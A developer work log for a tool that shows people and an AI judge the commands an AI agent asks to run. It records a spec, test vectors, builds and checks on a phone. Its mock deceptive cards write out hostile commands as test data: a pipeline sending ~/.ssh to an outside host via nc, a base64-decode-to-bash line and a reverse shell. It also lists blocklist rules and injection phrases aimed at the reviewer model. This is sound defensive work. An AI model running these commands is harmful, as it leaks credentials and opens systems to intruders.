# P0: "card truth" and the decision (work log)

Task: the card must show the real command, the danger, and what a signature covers (the `--help` keygen bug was fixed separately). Area:
everything a person sees and taps at the moment of the decision, on the phone, the watch and in `wardenctl`.
The log is kept in batches: if the work is stopped, it shows what is done and what comes next.

## Initial observations (2026-09-27)

- The real claude-cli wrapper per `~/.wardend/journal.jsonl` (read only, 2578 `bash -c` entries
  with `eval`, all `/bin/bash -c`, exactly 3 argv elements):

  ```
  source <HOME>/.claude/shell-snapshots/snapshot-bash-<ms>-<6 [a-z0-9]>.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval '<CMD>' < /dev/null && pwd -P >| <TMP>/claude-<4 hex>-cwd
  ```

  A variant without ` < /dev/null` when the command has a heredoc. Inside `eval` a single quote
  is encoded as `'"'"'` (not `'\''`, as the old code assumed), so the old folding cut
  such commands off at the first quote.
- All wardend exec cards are roots or delegating launches (a ticket is requested only for
  `root` and `delegating`, `daemon/supervisor.go`), so "allowing covers everything the command
  starts" holds for any exec card, and this is known without `meta`.

## Plan

1. Spec `protocol/DISPLAY.md` and vectors `protocol/vectors/display_vectors.json`.
2. TS: `app/src/core/display.ts`, tests in `scripts/test-core.mjs`.
3. Go: `daemon/cmd/wardenctl/display.go`, `card.go` (the `meta` type bug, two blocks).
4. Swift: `app/targets/watch/Protocol/Display.swift`, tests, the watch screen.
5. App: rules in any mode, the dangerous card, "not rated", the card leaving, consequences,
   biometrics, strings.
6. Judge: full argv and parts, the command text marked as untrusted.
7. Mock cards for deceptive cases, builds, screenshots.

## Progress

### Batch 1 (2026-09-27, evening): spec, vectors, TS and Go

- `protocol/DISPLAY.md`: sanitizer (code point classes, the `⟨U+XXXX⟩` marker, flags), homoglyphs,
  the parts lexer, rules (text is normalized: invisible characters removed, quotes stripped, lower case;
  patterns in the common subset of JS/RE2/Swift Regex), delegating launches by the signed `exe`/`argv[0]`,
  the exact claude-cli wrapper template, the card model (parts, rule attribution by pipelines,
  "N more" visibility only for safe parts, the header).
- Blocklist extended: `pipe-shell`, `exec-dynamic`, `decode`, `netcat`, `reverse-shell`;
  `rm-rf` now goes by targets like the wardend deny rule (does not catch `rm -rf /home/u/proj/build`, catches
  `rm -r ~`, `rm -rf "$HOME"`, `-R`); injections: `decision=allow`, `pre-approved`, `reviewer note`.
- `protocol/vectors/display_vectors.json` (45 cards, including attacking ones), generator
  `app/scripts/gen-display-vectors.mjs`, reference `app/src/core/display.ts`.
- Go: `daemon/cmd/wardenctl/display.go` + a vector test; `card.go`: meta is parsed leniently
  (`delegating` as a string, `insideRoot` as a number: the bool bug), the card in two blocks ("Signed facts",
  "Not confirmed"), `!!! DANGEROUS` with reasons, dangerous parts marked with `!`, "N more" only for
  safe parts, "no answer means deny", "covers everything this command starts".
- Tests: `node --test scripts/test-core.mjs` 19/19; `go test ./cmd/wardenctl/` ok.

### Batch 2: Swift (watch)

- `app/targets/watch/Protocol/Display.swift`: the same spec in Swift without Foundation; rules
  via Swift Regex with `asciiOnlyWordCharacters`, `wordBoundaryKind(.simple)`,
  `matchingSemantics(.unicodeScalar)`; strings are processed by scalars (not by Character).
  A pattern that does not compile counts as matched (the card becomes dangerous, not the other way round).
- `WardenProtocolTests/DisplayTests.swift`: tables, sanitizer, normalization, lexer, all 45
  vector cards. `swift test` (toolchain 6.4 on the Pi, scratch in /srv/scratch/p0/swiftbuild):
  13/13. The old `evalArgument` folding in `Protocol.swift` is removed, `displayCommand` goes through Display.
- Watch: in the list, dangerous cards get a red label and a timer; the card screen: a "Dangerous" block with
  reasons, "Signed facts" (command parts, "N more" as a button, the deadline and "No answer, then
  deny", "Allowing covers everything…", cwd, exe, uid, host, the full argv and the chain behind a button),
  "Not confirmed" (meta.class/rule/delegating/insideRoot and meta.judge as the model's opinion).
  Approval, as before, only by holding or with the Crown; the Crown resets after 2 s without
  turning; after a decision it returns to the list (no "already decided" screen).
- `.userPresence`: left off, the decision is described in `docs/BUILD.md` (a flag on the key, and
  this key signs every long poll and every deny; the key is available only on an unlocked
  watch, and the watch locks when it is taken off the wrist).
- SwiftUI cannot be built on Linux: `swiftc -parse` of all watch files and `-typecheck` of the card model
  (`Card.from`, `CardText`) together with Protocol passed; the full check will be in the EAS simulator build.

### Batch 3: the app

- Card (`src/ui/screens/FeedScreen.tsx`): a "Signed facts" block (command parts, dangerous ones
  with a red bar and untruncated, "N more (no rules, no flags)", host · cwd · form, exe and uid;
  expanded: the full argv, uid/gid, chain, deadline, "environment variables not shown, only the hash")
  and separately "Model opinion, not signed" (the chip in words, reason, explanation) and "Server
  context, not signed" (meta.class/rule/delegating/insideRoot/hardware/judge), "Technical details".
- Dangerous card (`src/core/safety.ts`): rules, sanitizer flags, delegating launch by the
  signed exe/argv0 (meta can only add). Red frame, "⚠ Dangerous" and reasons in words,
  "Deny" is the primary button (filled, wider), "Allow" only by a 1.5 s hold with a progress fill.
- Rules in any mode (`controller.addCard` → `judgeCard` always; in manual mode `callModel: false`).
  With no matches in manual mode the verdict is `source: manual, risk: null`, not written to the journal.
- "Not rated": `Verdict.risk` is now `number | null`; manual, no-model, model-error give null and a
  grey chip "Not rated: manual mode / no model configured / judge unavailable"; rules: a red chip
  "Rule fired"; model: "Low/Medium/High risk N/100". Chip colors with contrast of at least
  4.5:1 (dark 5.8–9.5, light 4.9–14). `signableRisk(null)` is not signed, delegation
  does not allow without a score.
- After a decision: the card stays visible for another 260 ms and shrinks (neighbors slide in smoothly), moved
  and new cards have their buttons inactive and dimmed for 700 ms, a snackbar "Allowed/Denied: <part> · in
  the journal" for 4 s and a vibration (`expo-haptics`).
- Consequences: the deadline bar (red in the last 20 s), "No answer in M:SS → deny", for exec
  "Allowing covers everything this command starts while it runs", expanded "Deny:
  the command does not run, the agent gets an error".
- Biometrics (`src/core/biometric.ts`, `expo-local-authentication`): before signing an allow, always for
  dangerous cards and roots (any exec card), for all with "Every approval" in settings; no biometrics means
  the device code (the module itself falls back to DEVICE_CREDENTIAL); no screen lock means a
  warning in settings and signing without confirmation. Deny never asks. The check is in
  `controller.resolveCard`, so on the YubiKey path too.
- Judge (`decide.buildUserPrompt`): for exec the full argv JSON (sanitized), the form (wrapper),
  all parts, the rules and flags found, exe/cwd/uid/host/chain; everything from the agent inside
  `<<<UNTRUSTED … UNTRUSTED>>>`, and the system prompt explains this. The local judge uses the same prompt.
- Mock cards: `src/core/__fixtures__/ui_mock_cards.json` (plain, eval, rtl, zw, tail, b64,
  homoglyph, root, injection, manyparts), deep link `wardenclaw://bench?mockui=<ids>|all[&mockhw=1]`;
  `judge_bench_cases.json` untouched. Mock cards now also go through the judge (rules).
- en/ru strings for everything new; blocklist reasons rewritten in plain words.
- Checks: `npx tsc --noEmit` in a clone with the new packages: 0 errors; `node --test
  scripts/test-core.mjs`: 22/22.

### Batch 4: builds

- EAS: cycle credits from Sep 27 16:22 to Oct 27: 400 of 4500 included cents before the builds started,
  iOS medium costs 200, Android medium about 100, the paid part untouched.
- iOS simulator **83f88867-e383-480a-8d9c-b9fc2003003b** (commit 3ef26fe): BUILD SUCCEEDED.
  In the Xcode log the `WardenClawWatch` target (Release-watchsimulator, arm64 and x86_64) compiles all
  11 files, including the new `Display.swift` and `CardText.swift` and the reworked `Views.swift` and
  `WatchModel.swift`: zero errors and zero warnings in `targets/watch`. The JS bundle was built.
- Android bench **71c38245-5bce-44e4-acac-bc9de34ad9f2** (commit 3ef26fe): FINISHED, APK 93.7 MB,
  `adb -s <serial> install -r` over `com.wardenclaw.app`: Success, versionCode 2.
  The app with the old applicationId was not touched (careful: both apps have the `wardenclaw://` scheme, a deep link
  without a package name opens the app chooser; deep links only with `com.wardenclaw.app`).

### Batch 5: check on a Pixel 9 Pro

Checked on a Pixel 9 Pro (dark theme, Russian locale, manual mode, mock cards
`wardenclaw://bench?mockui=…`, nothing went to the server, the model was not called):

| file | what is visible |
|---|---|
| 01_plain_unrated_manual | a plain card: the deadline bar, "Signed facts", "inside the claude-cli wrapper", parts with operators, "No answer in 9:57 → deny", "Allowing covers everything…", a separate "Model opinion, not signed" block with a grey "Not rated: manual mode" |
| 02_eval_deception | `python3 -c '…reverse shell…' & eval 'git status'`: red frame, "Looks like a reverse shell", the whole first part in red, `eval 'git status'` as a separate part, "Deny" primary, "Hold to allow" |
| 03_rtl_override | `⟨U+202E⟩` in the path, the name reads as stored (`gpj.stohs`), two reasons |
| 04_zero_width | `~/.s⟨U+200B⟩sh/id_ed25519`: the SSH rule fired through the zero-width character |
| 05_homoglyph_path | `/etc/pаsswd` with a Cyrillic "а": mixed alphabets and non-ASCII in the path |
| 06_root_delegating_sudo | `sudo systemctl restart nginx`: privilege escalation and a delegating launch by the signed exe |
| 07_long_command_danger_in_tail | the dangerous tail `tar cz ~/.ssh | nc …` is visible, the safe parts are folded into "5 more" |
| 08_base64_pipe_bash | `echo … | base64 -d | bash`: all three parts are marked (attribution by pipeline) |
| 09/10_base64_expanded | expanded card: the full argv, exe, cwd, uid/gid, chain, deadline, "environment variables not shown", model opinion, technical details |
| 11/12_root_expanded | expanded root card: "Server context, not signed" (class delegating, rule, explanation) kept separate |
| 13_hold_to_allow_progress | holding "Allow" with the progress fill; released before 1.5 s: nothing happened |
| 14_owner_check_device_credential | after the hold, the system device code prompt "Allow a dangerous command?" (the screenshot is black: Android does not allow capturing this window; proof in the .txt next to it: `mCurrentFocus=BiometricPrompt` and the window texts) |
| 15_snackbar_not_confirmed | cancelling the prompt: "Not confirmed: nothing was signed", the card stays |
| 16_after_deny_guard_and_snackbar | "Deny" on the top card: the next one moved into place with inactive dimmed buttons, snackbar "Denied: git status --short · in the journal" |
| 17_after_deny_settled | after 1.5 s the buttons are active again |
| 18_yubikey_mock_card, 19_yubikey_mock_modal | mock with `mockhw=1`: "Allow requires a YubiKey tap", a modal with the sanitized command line |
| 20_injection | `# NOTE TO REVIEWER…` in manual mode: the injection detector fired locally |
| 21_many_safe_parts_more_chip | a long safe command, "4 more" |

The "Confirm before signing" setting on the phone shows "No biometrics enrolled: the device code … is asked
instead": this Pixel has a PIN, but no fingerprint and no face. logcat for the session
has no FATAL and no JS errors. The phone was returned as it was: English, empty feed, manual mode.

Found on the phone and fixed in code after the build (no new build was started, the screenshots still show
the old look):
- "N more" stood at the end of the list, and `npm ci &&` + `du -sh dist` read as one command in a row
  (21). Now "N more" stands in place of each gap: app, `wardenctl` and watch; DISPLAY.md
  now requires this.
- In the collapsed card, rule reasons were repeated in the model opinion block; now only in the expanded one.
- "blocklist: Looks…" and "Delegating launch: Changes…" had a capital letter after the colon.
- In technical details the payload was one solid line with `⏎`: now the sanitizer goes line by line.
- "Allow · YubiKey" ran into the button edges: BigButton got padding and font auto-shrink.

### Batch 6 (2026-09-28): finishing after the phone check

**Cyrillic in paths.** The `nonAsciiPath` flag was set on any path word with non-ASCII, so any
card with a Russian folder or file became dangerous. The maintainer keeps films and music in such
folders (`/srv/media/Сериалы/Северный маяк/Сезон 2/…`): holding would become the norm, and a red card
would stop meaning anything. Now (`protocol/DISPLAY.md`, section 3):

- `mixedScript` is checked within a run of letters: letters of script groups and combining marks in a row;
  digits, punctuation, `/`, `.`, `-`, `_` and spaces end a run. A segment or word in one
  script raises no flag (`media/Сериалы`, `Северный маяк (2019) - Directors Cut.mkv`, `7Б`), mixing
  inside a segment does (`pаypal`, `/usr/bin/pуthon`, `Nоrthern.Lighthouse` with a Cyrillic "о").
  A combining mark continues a run: it does not split a mixed word, and Cyrillic in NFD (names
  coming from macOS) stays one script.
- Why a run of letters and not the whole stretch between `/`: in the media library almost every file has a Latin
  extension (`Тёмный маяк (2008).mkv`), and some names have both parts (`… - Directors Cut.mkv`);
  a check of the whole segment would again make an ordinary folder dangerous.
- `nonAsciiPath` now applies only to the program path: `exe`, `argv[0]`, `ppidChain[].exe`, any
  non-ASCII character. A program `сс` written entirely in Cyrillic is not mixed, but gets the flag.
- A word made entirely of Cyrillic look-alikes outside the program path stays unflagged (`аррӏе.com`,
  the command `рір` via `PATH`); this is written down in DISPLAY.md together with the reason.
- Vectors: the `scripts` and `marks` tables (all three implementations check their copies), 52 cases. New
  safe: `cyrillic-films-wrapper`, `cyrillic-films-argv`; new dangerous:
  `mixed-segment-in-films-path`, `homoglyph-python-argv`, `homoglyph-python-wrapper`,
  `cyrillic-program-name`, `argv0-non-ascii`. `cyrillic-path-only` became safe. Combining
  marks in the file are escaped as `\uXXXX`.
- The flag reason in words: "Non-ASCII characters in the path of the program (exe or argv[0]): a letter may only
  look Latin" (app, watch, wardenctl).
- Mock cards: `cyrillic`, `mixedseg`, `pyhomoglyph`.

**`wardenctl watch`.** A dangerous card (the same check as the `!!! DANGEROUS` line, plus meta about a
delegating launch, as in the app and on the watch) is allowed only by the whole word `allow`: `y`,
`yes` and other short answers are asked again with "Not allowed: the card is dangerous…". Ordinary cards
as before, `allow` works for them too. Answer parsing moved to `watchAnswer` (table test
`TestWatchAnswer`), the shared danger check to `dangerOf` (`TestDangerOf`); the e2e `TestE2EWatch`
got a dangerous but harmless card `echo token-ran` (secrets rule): `y` was refused,
`allow` ran it (rc4=0). Usage, `--help`, the wardenctl README and `docs/CLI.md` describe `allow`.

**Assessment block.** The blocklist verdict sat under the heading "Model opinion, not signed".

- App: an "Assessment, not signed" block, inside "Rule:
  [Blocklist matched]" or "Rule: [Looks like an injection]", for the judge "Model: [Medium risk
  55/100] Judge: …" or "Model: [Not rated (manual mode)]". meta.judge in the server context:
  "Model, as sent by the server (meta.judge)".
- Watch: a separate "Assessment, not signed" block with "Rule: blocklist matched / looks like an injection"
  (local rules) and "Model (from the server): N/100" (meta.judge). "Not confirmed" keeps the
  class, "Server rule" (meta.rule), delegation and root.
- wardenctl: an "Assessment, not signed" section after the signed facts: "Rule: blocklist
  matched" (with reasons in the full view), "Rule: looks like an injection", "Model (sent by
  the transport, meta.judge): …"; the line "model opinion (not signed)" is gone.

**Checks** (at commit 96c17bb):

- `npx tsc --noEmit` in a clone: 0 errors; `node --test scripts/test-core.mjs`: 23/23.
- `go test -p 1` per package via `systemd-run --user --wait --pipe` in a clone: `cmd/wardenctl`
  ok (34 tests, including e2e, 17 s), `wardend` ok (12 s), `envelope`, `hwkey`, `journal`,
  `policy`, `qr` ok.
- `swift test` in `app/targets` (toolchain 6.4 on the Pi): 13/13, including the check of the `scripts` and
  `marks` tables and all 52 cases. SwiftUI cannot be built on Linux: `swiftc -parse` for `Views.swift` and
  `-typecheck` for `CardText.swift` together with Protocol passed.

**Builds** (clone `/srv/scratch/mono-ios` at 96c17bb, one at a time, so as not to take the only slot
ahead of a possible iOS production build; there was no production build in the queue):

- Cycle credits Sep 27 16:22 → Oct 27: before the builds 700 of 4500 included cents, after 1000 of 4500;
  paid part 0.
- Android bench **2f09ca44-f700-4027-a586-9ba5885c36e7**: FINISHED, APK 93.7 MB,
  `adb -s <serial> install -r` over `com.wardenclaw.app`: Success, versionCode 3.
  The app with the old applicationId was not touched (versionCode 1, updated Sep 27 14:54).
- iOS simulator **05679ab9-fabd-4e1f-b559-496fdcb61669**: BUILD SUCCEEDED. In the Xcode log the
  `WardenClawWatch` target (Release-watchsimulator, arm64 and x86_64) compiles all 11 files, including
  the new `Views.swift`, `CardText.swift`, `Display.swift`: zero errors and zero warnings in
  `targets/watch` (the log has only the old linker warnings about `-lc++` and the Metal path).

Checked on device (dark theme, Russian locale, manual mode, mock cards,
nothing went to the server, the model was not called):

| file | what is visible |
|---|---|
| v2_01_cyrillic_path_no_flag | `ffprobe` on `/srv/media/Сериалы/Северный маяк/Сезон 2/…mkv`, cwd is Russian too: no frame and no "Dangerous", an ordinary "Allow"; "Assessment, not signed → Model: Not rated (manual mode)" |
| v2_02_homoglyph_python_flag | `'/usr/bin/pуthon' manage.py migrate` (a Cyrillic "у", the same exe): red frame, two reasons (mixed alphabets; non-ASCII in the program path), hold |
| v2_03_mixed_segment_flag | `mpv ".../Северный маяк/Сезон 2/Nоrthern.Lighthouse.S02E06.mkv"` with a Cyrillic "о": dangerous only because of the mix within the segment, the Russian folders next to it raise no flag |
| v2_04_more_in_gap_and_rule | a long command: "4 more (no rules, no flags)" between `ls` and `tar cz ~/.ssh`, "1 more" between `tar` and `nc`; "Rule: Blocklist matched" |
| v2_05_assessment_rule_expanded | expanded card: "Assessment, not signed → Rule: Blocklist matched", reasons, "blocklist · 0.0 s"; below it, separately, "Server context, not signed" |

logcat for the session has no FATAL and no JS errors. The phone was returned as it was: English, empty feed,
manual mode.

Noticed on the phone, not changed (for a decision):
- A pipeline stage without rules is hidden even between two dangerous ones: `tar cz ~/.ssh | 1 more | nc …`
  (`base64` is hidden). Perhaps a pipeline with a dangerous part should be shown whole.
- The reason "mixed alphabets in one word" does not say which word: `Nоrthern` looks like `Northern`.
  The substituted letter itself could be marked in the part (for example, `S⟨о U+043E⟩ns`).
- In the expanded rule verdict the explanation sits under the label "What it does:", but it is text about the rule, not
  about the command.

Commits: 3aea312 (homoglyphs: spec, vectors, TS/Go/Swift), 60f62e7 (wardenctl: `allow` in
watch, assessment in the card), 96c17bb (app and watch: "Assessment, not signed").

### Batch 7 (2026-09-28): the whole pipeline, where a letter is substituted, "Why it fired"

Three remarks from the phone in batch 6.

**A chain with a dangerous part is shown whole** (`protocol/DISPLAY.md`, section 7, `visible`). A chain:
parts joined by `|` (and `|&`), `&&` or `||`; `;`, `&`, a newline and the end of the script (even
after an operator) end it. If a chain has a part with a rule or a flag, all of its
parts are visible; "N more" remains only for parts of safe chains. Previously `tar cz ~/.ssh | 1 more | nc …`
hid `base64` between two dangerous stages; now `tar cz ~/.ssh | base64 | nc …` is shown in a row,
and a safe chain next to it (after `;`) folds as before. Rule attribution by pipelines has not
changed.

**Where a letter is substituted** (`DISPLAY.md`, sections 3, 7, 8). Each mixed run now comes with its
position and the foreign letters, in code points of the displayed text (after the sanitizer: a
`⟨U+XXXX⟩` marker before or inside a run shifts positions by its length): `at` (start of the run),
`word` (the run as displayed), `among` (the main script: the most letters, on a tie the one whose
letter comes first), `odd` (`at` within the word, `char`, `script`). Each part has `parts[].mixed` (positions in its
`text`), the card has `mixed`: words from argv, exe and the chain without repeats (the same `pуthon` in argv[0] and
exe once). Group names in the vectors: `scriptNames` (`latin`, `greek`, `cyrillic`, `armenian`,
`cherokee`, `fullwidth`).

- App: the foreign letter gets a background (the "medium risk" color, contrast ≥ 4.5:1 in both themes),
  an underline and a `⟨Cyr.⟩` marker after it (after combining marks, so the mark is not torn from its
  letter) in the command parts, in the exe line, in the full argv and in the process chain. The reason instead of "Mixed
  alphabets in one word": "In the word “Nоrthern” a Cyrillic “о” among Latin letters";
  identical letters of a word once, at most three words, then
  "More words with mixed alphabets: N"; a long word as a 40-character window around the letter.
- Watch (`CardText.mixed`, `markedText` in `Views.swift`): in a part the letter is underlined in orange and the marker
  is text (`Nо⟨Cyr.⟩rthern`), the reasons in the same words. Text is built by interpolation, without `+`
  (in SDK 26 `+` on Text is deprecated).
- wardenctl: `Nо⟨Cyr.⟩rthern` in the part, in exe and in the chain; `!!! DANGEROUS: in the word "Nоrthern" a Cyrillic
  "о" among Latin letters`.

**"Why it fired:"**. For a rule verdict (blocklist, injection) the explanation in the expanded card
now sits under the label "Why it fired:", the model keeps "What it does:". The same
in the journal for rule entries.

**Vectors**: 60 cases (was 52). New: `pipeline-with-danger-shown-whole`,
`and-chain-with-danger-shown-whole`, `safe-long-pipeline-folds`,
`danger-chain-after-semicolon-safe-chain-folds`, `chain-ends-with-operator`,
`latin-letter-among-cyrillic`, `mixed-two-words-and-exe`, `mixed-after-emoji-and-marker`. The
expectations of two old ones changed: `long-danger-tail` (`base64` is visible, "4 more" instead of 5) and
`fake-wrapper-snapshot-subst` (the dangerous first chain of the fake wrapper is shown whole). The
`tokenFlags` inputs gained `mixed` and seven new rows (main script on a tie, a run starting with a
combining mark, positions after an emoji and after the ⟨U+E0041⟩ marker, U+034F inside a run).
Mock card `semichain`: a safe `&&` chain and a dangerous pipeline after `;`.

**Checks** (clone `/srv/scratch/mono-ios` at e250c9d):

- `npx tsc --noEmit`: 0 errors; `node --test scripts/test-core.mjs`: 25/25 (new: whole chains
  and the general property "a hidden part is never in a dangerous chain" over all vectors; position and character,
  highlight chunks, reasons in Russian and in English).
- `go test -p 1 ./cmd/wardenctl/` via `systemd-run --user --wait --pipe` (RuntimeMaxSec=140):
  ok, 36 tests in 18 s (new `TestPrintCardShowsDangerousChainWhole`,
  `TestPrintCardMarksOddLetter`; `TestDangerOf` expects the word and the letter).
- `swift test` in `app/targets` (toolchain 6.4): 15/15 (new: whole chain, chunks with a combining
  mark; checks of `scriptNames` and of `mixed` for inputs, parts and cards). SwiftUI cannot be built on Linux:
  `swiftc -typecheck` for `CardText.swift` together with Protocol and `swiftc -parse` for `Views.swift`
  passed.

Commits: 1f921fe (spec, vectors, TS/Go/Swift, reasons in the app core), 71a6b5b
(wardenctl: the letter marker, the word in the reason), e250c9d (app and watch: highlighting, "Why it
fired").

### Batch 8 (2026-09-28): checking batch 7 with builds and on the phone

Both builds were started by the previous worker from the clone `/srv/scratch/mono-ios` at e250c9d (01:50 and 02:09),
which then broke off; this one finished the status, installation, screenshots and Xcode logs. The commits after e250c9d (e08088e
… 06f491d: wardend, install.sh, site) do not touch `app/` and `protocol/`, so for the app and the
watch these builds match the current HEAD; no new ones were started. The clone was pulled up to 06f491d.

**Builds**

- Cycle credits Sep 27 16:22 → Oct 27: before the builds 1000 of 4500 included cents (01:48), after 1300
  of 4500 (Android 100, iOS 200); paid part 0, the bill has only the subscription.
- Android bench **bb684248-3357-4b2f-a33b-ac5faf49b8a6**: FINISHED, APK 93.7 MB. The task was reset
  by a launch from the launcher (`am start -S -f 0x10008000 … LAUNCHER`, baseIntent became LAUNCHER), then
  `adb -s <serial> install -r` over `com.wardenclaw.app`: Success, versionCode 4 (was 3).
  No deep link replay and no crashes after installation. The app with the old applicationId was not touched (versionCode 1,
  updated Sep 27 14:54).
- iOS simulator **a7a05c46-dc8a-47e7-a584-339ddbbe4e84**: FINISHED in 5.6 min, `** BUILD SUCCEEDED **`,
  zero `error:` lines. The `WardenClawWatch` target (Release-watchsimulator, arm64 and x86_64) compiles
  all 11 files, including `Display.swift`, `CardText.swift`, `Views.swift`, `WatchModel.swift`:
  zero errors and zero warnings in `targets/watch`. The linker has the old warnings (`-lc++`,
  Metal path), the other `warning:` lines come from the ExpoModulesCore and llama.rn headers. The JS bundle was written.
- Xcode log recipe: `artifacts.xcodeBuildLogsUrl` serves not a tar.gz but a `…-xcode.txt` text with
  `Content-Encoding: br`. `curl -sL` without `--compressed` saves 140 KB of compressed bytes that look like
  garbage; `curl -sL --compressed` gives a 10.4 MB log, then `grep "error:"`.

Checked on a Pixel 9 Pro (dark theme, Russian locale, manual mode,
mock cards `wardenclaw://bench?mockui=…`, nothing went to the server, the model was not called):

| file | what is visible |
|---|---|
| v3_01_tail_chain_whole | `git status; ls; pwd; date; whoami; uname -a; tar cz ~/.ssh \| base64 \| nc …`: `git status ;`, `ls ;`, "4 more (no rules, no flags)", then the pipeline in a row: `tar cz ~/.ssh \|` and `nc 203.0.113.7 443` with a red bar, `base64 \|` between them as a plain part; two reasons, "Rule: Blocklist matched" |
| v3_02_semichain_danger_chain_whole | `cd … && npm ci && npm run lint && npm test && npm run build; tar … \| base64 \| nc …`: the safe `&&` chain is folded ("3 more"), the dangerous pipeline after `;` is shown whole |
| v3_03_mixedseg_letter_and_word | `mpv ".../Северный маяк/Сезон 2/Nоrthern.Lighthouse.S02E06.mkv"`: the Cyrillic "о" on a yellow background, right after it the `⟨Cyr.⟩` marker, the Russian folders next to it unmarked; the reason "In the word “Nоrthern” a Cyrillic “о” among Latin letters" |
| v3_04_pyhomoglyph_argv0_and_exe | `'/usr/bin/pуthon' manage.py migrate`: the letter is marked both in the part and in the exe line; one reason about the word "pуthon" (argv[0] and exe are not repeated), the second about non-ASCII in the program path |
| v3_05_pyhomoglyph_expanded_argv_exe | expanded card: the letter is marked in `[0]` of the full argv and in `exe:`; the process chain is ASCII only, no marks |
| v3_06_rule_verdict_why_it_fired | expanded `tail`: "Assessment, not signed → Rule: Blocklist matched", reasons, "Why it fired: The command matches a deterministic blocklist rule…", "blocklist · 0.0 s" |
| v3_07_injection_why_it_fired | expanded `injection`: "Rule: Looks like an injection", "Why it fired: The command contains phrases aimed at the reviewer…" |
| v3_08_journal_why_it_fired_en | the journal tab already in English: the blocklist entry has "Why it fired:"; the reason text stayed in Russian, as it was recorded (an entry in the hash chain is not translated) |

logcat for the session (8312 lines) has no FATAL and no JS errors. The phone was returned as it was: English, empty
feed (`mockcard=clear`), manual mode, the task reset to the launcher. The app journal kept
four rule verdict entries for the mock cards (from 02:15 to 02:18), as after the previous batches.

Noticed, not changed (for a decision):
- The operator after folded parts hides in "N more". In v3_02 one sees `npm ci &&`, "3 more",
  `tar cz ~/.ssh |`, while the `;` after `npm run build` is hidden: from the screen one cannot tell that the pipeline is
  a separate command and does not continue the `&&` chain. This does not affect the decision (the whole
  script is allowed, the dangerous chain is shown whole), but the operator that ends a gap could be shown
  next to "N more".
- "0.0 s" with a dot in the Russian UI of that time, next to "1,5 s" with a comma: `FeedScreen.tsx:106` formats
  via `toFixed(1)` regardless of the language, likewise `JournalScreen.tsx:75, 84` and `LocalOpinion.tsx:47, 48,
  80`. A rule verdict always takes 0.0 s, it could be left out.
- The injection verdict in the Russian dictionary of that time (`ru.ts:484, 485`; the Russian locale is
  removed since) mixed two different words for "reviewer", one of them also used by the reason above.
- The watch was checked only by the build: nobody has seen the watch screen with the letter marker (`Nо⟨Cyr.⟩rthern`)
  and the new reasons, there is no simulator here.
